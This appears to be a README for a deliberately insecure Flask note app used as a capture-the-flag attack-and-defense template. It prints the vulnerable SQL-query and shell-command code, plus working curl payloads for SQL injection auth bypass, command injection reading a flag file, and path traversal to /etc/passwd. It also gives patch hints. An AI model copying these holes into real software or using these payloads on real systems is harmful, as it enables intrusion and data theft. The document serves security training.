# `example-vuln` - Template Vulnerable Web Application

A small Flask app called **TurtleNotes** that ships the
*Attack & Defense* contract documented in
[`services/README.md`](../README.md). It is intentionally insecure: every
vulnerability is documented below so checker authors and patchers know what
they are working with.

> Do **not** expose this service to untrusted networks. It exists to be
> exploited inside the `ctf-network` bridge created by the Sandcastle
> scaffold.

## Layout

```text
services/example-vuln/
├── Dockerfile
├── docker-compose.yml         # standalone compose for local iteration
├── README.md
├── app/
│   ├── app.py                 # Flask app + the deliberate vulnerabilities
│   ├── requirements.txt
│   └── templates/             # Jinja templates
└── exploits/                  # reference exploit scripts (one per vuln)
```

The top-level scaffold copies this template into each
`teams/generated/team<N>/example-vuln` directory. Each `team<N>-vuln` machine
mounts that team's copy at `~/example-vuln`; running Docker Compose there starts
`team<N>-vuln-app`, gives it its own `/app/data` volume, and seeds its own flag.

## Running it standalone

```bash
cd services/example-vuln
docker compose up -d --build
curl http://localhost:8080/health   # {"status":"ok"}
```

Tear down (and drop the seeded SQLite database):

```bash
docker compose down -v
```

The standalone compose binds the app to host port `8080` by default. Set
`HOST_PORT=...` to publish on a different port.

## Running it through the Sandcastle scaffold

Generate the team topology, then SSH through the gateway into the vulnerable
machine and start the app from its copied workspace:

```bash
./scripts/setup.sh --teams 4
docker compose up --build
ssh -p 2201 team1@localhost
ssh team1@team1-vuln
cd ~/example-vuln
docker compose up -d --build
```

Each `team<N>-vuln-app` container boots with `TEAM_ID=<N>`,
`TEAM_NAME=Team <N>`, `SERVICE_PORT=8080`, and a per-team
`sandcastle_team<N>-data` volume mounted at `/app/data`.

## Data model

On first boot the app creates `app.db` (SQLite) under `/app/data` with two
tables:

| Table  | Columns                                                   |
|--------|-----------------------------------------------------------|
| users  | `id, username, password, is_admin`                        |
| notes  | `id, owner_id, title, body, is_secret, created_at`        |

It also seeds:

* an `admin` user with a random password (logged once, never returned)
* a `guest` user with the password `guest` so reviewers can poke around
* a starter flag stored both as the body of a secret note owned by `admin`
  *and* as the file `/app/data/flag.txt`

The gameserver can rotate the planted flag each round by POSTing to
`/internal/plant` with the `X-Plant-Token` header (defaults to `SECRET_KEY`).

## Deliberate vulnerabilities

All three live in `app/app.py`. `grep -n "VULN:"` highlights them.

### 1. SQL injection - `/login`

Credentials are concatenated directly into the query:

```python
query = (
    "SELECT id, username, is_admin FROM users "
    f"WHERE username = '{username}' AND password = '{password}' "
    "LIMIT 1"
)
db.execute(query).fetchone()
```

Any classic auth-bypass payload works. For example:

```bash
curl -i -c /tmp/c -b /tmp/c \
    -d "username=admin' --&password=anything" \
    http://localhost:8080/login

curl -s -b /tmp/c http://localhost:8080/notes  # admin's secret note (flag)
```

### 2. Command injection - `/admin/diagnostics`

The host argument is interpolated into a shell command:

```python
cmd = f"ping -c 1 -W 1 {host}"
subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
```

Reading the on-disk flag is a single payload:

```bash
curl -s -d 'host=127.0.0.1; cat /app/data/flag.txt' \
    http://localhost:8080/admin/diagnostics
```

### 3. Path traversal - `/export`

The user-controlled `file` parameter is joined onto `NOTES_DIR` without any
canonicalization, so escaping the directory is trivial:

```bash
curl -s 'http://localhost:8080/export?file=../flag.txt'
curl -s 'http://localhost:8080/export?file=../../etc/passwd'
```

## Reference exploits

The [`exploits/`](./exploits) directory contains one runnable script per
vulnerability, each implemented in pure Python so they can be used as a
starting point for an SLA checker or a red-team smoke test:

```bash
python exploits/sqli_login.py http://localhost:8080
python exploits/cmdi_diagnostics.py http://localhost:8080
python exploits/path_traversal_export.py http://localhost:8080
```

## Patcher hints

If you are defending this service, the safest minimal patches are:

1. Replace the `/login` query with a parameterised statement and verify the
   password using `secrets.compare_digest`.
2. Replace `subprocess.run(..., shell=True)` in `/admin/diagnostics` with
   an argument list (`["ping", "-c", "1", host]`) and validate `host`
   against an IP/hostname regex, or remove the endpoint entirely.
3. In `/export`, resolve the requested path with
   `Path(NOTES_DIR).joinpath(name).resolve()` and refuse anything that is
   not inside `NOTES_DIR`.

Any of those three patches stops the corresponding flag-leak path without
breaking the rest of the API surface, so they should pass the SLA checker
once it is wired up.
